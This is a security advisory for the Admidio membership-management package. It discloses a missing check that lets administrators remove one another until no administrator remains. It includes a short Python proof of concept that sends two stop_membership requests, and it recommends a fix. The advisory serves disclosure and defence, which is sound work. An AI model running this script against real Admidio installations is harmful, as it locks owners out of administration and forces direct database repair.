# [M] Admidio Missing Minimum Administrator Check in Role Membership Removal

## Summary
Severity: Medium
Advisory: GHSA-c7xm-r6vj-8vg6
CVE: CVE-2026-41662
CWE: CWE-754
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:U/C:N/I:L/A:H (CVSS_V3)
Published: 2026-04-29
Source: https://github.com/advisories/GHSA-c7xm-r6vj-8vg6
Type: github-advisory

## Affected
- Packagist: `admidio/admidio` — affected >=0 <5.0.9

## Details
## Summary

`Role::stopMembership()` does not verify whether removing a user from the administrator role leaves zero administrators. The deprecated `Membership::stopMembership()` contains this safety check, but the current code path bypasses it. Any administrator can remove the last remaining other administrator, locking the entire system out of administrative access. The exploit does not require concurrent requests; sequential removals produce the same result.

## Details

`Role::stopMembership()` in `src/Roles/Entity/Role.php` stops a user's membership in a role without verifying whether the action leaves the administrator role with zero members:

```php
// src/Roles/Entity/Role.php - Role::stopMembership()
public function stopMembership(int $userId): bool
{
    // No check for minimum administrator count
    // Directly updates membership end date
}
```

The deprecated `Membership::stopMembership()` contains this safety check and raises `SYS_MUST_HAVE_ADMINISTRATOR` when the removal would leave no admins, but current code paths no longer call this method.

`Role::setMembership()` includes a guard that prevents a user from removing their own administrator membership:

```php
if ($userId === $gCurrentUserId) {
    // Prevents self-removal from admin role
}
```

This guard does not prevent an administrator from removing the last other administrator. Consider a system with exactly two administrators (Admin A and Admin B):

1. Admin A removes Admin B from the administrator role. The self-removal check passes (Admin A is not removing themselves). No minimum-count check runs. Admin B loses admin access.
2. Admin A is now the sole administrator. Admin A cannot remove themselves (self-removal guard), but the system is one compromised account away from total lockout.
3. If Admin A and Admin B each send a removal request for the other (sequentially or concurrently), both succeed. The system has zero administrators.

The core bug is the missing minimum-administrator check in `Role::stopMembership()`, not timing. Sequential requests reproduce the issue just as concurrent ones do.

## Proof of Concept

Requirements: two active administrator accounts (Admin A and Admin B) with valid sessions.

```python
import requests

BASE = "https://admidio.example.com"

session_a = requests.Session()
session_b = requests.Session()

# Authenticate both sessions (login step omitted for brevity)

# Step 1: Admin A removes Admin B (sequential, no race needed)
resp1 = session_a.post(f"{BASE}/modules/profile/profile_function.php", data={
    "mode": "stop_membership",
    "user_uuid": ADMIN_B_UUID,
    "role_uuid": ADMIN_ROLE_UUID
})
print(f"Admin A removes Admin B: {resp1.status_code}")  # 200

# Step 2: Admin B removes Admin A (Admin B's session is still valid)
resp2 = session_b.post(f"{BASE}/modules/profile/profile_function.php", data={
    "mode": "stop_membership",
    "user_uuid": ADMIN_A_UUID,
    "role_uuid": ADMIN_ROLE_UUID
})
print(f"Admin B removes Admin A: {resp2.status_code}")  # 200

# The system now has 0 administrators.
```

After both requests complete, no users remain in the administrator role. The administrative interface becomes inaccessible. Recovery requires direct database manipulation to reassign the administrator role.

## Impact

Two colluding or compromised administrator accounts lock out all administrative access to the Admidio installation. Recovery demands direct database access, which may not be available on shared hosting environments. The attack does not require precise timing because `Role::stopMembership()` performs no minimum-admin-count check at all.

## Recommended Fix

Add a minimum-administrator-count check to `Role::stopMembership()`. Before stopping a membership in the administrator role, query the current count of active members. If stopping this membership would leave zero administrators, reject the request with `SYS_MUST_HAVE_ADMINISTRATOR`. This mirrors the check already present in the deprecated `Membership::stopMembership()` method.

---
*Found by [aisafe.io](https://aisafe.io)*

## References
- https://github.com/Admidio/admidio/security/advisories/GHSA-c7xm-r6vj-8vg6
- https://nvd.nist.gov/vuln/detail/CVE-2026-41662
- https://github.com/Admidio/admidio
- https://github.com/Admidio/admidio/releases/tag/v5.0.9
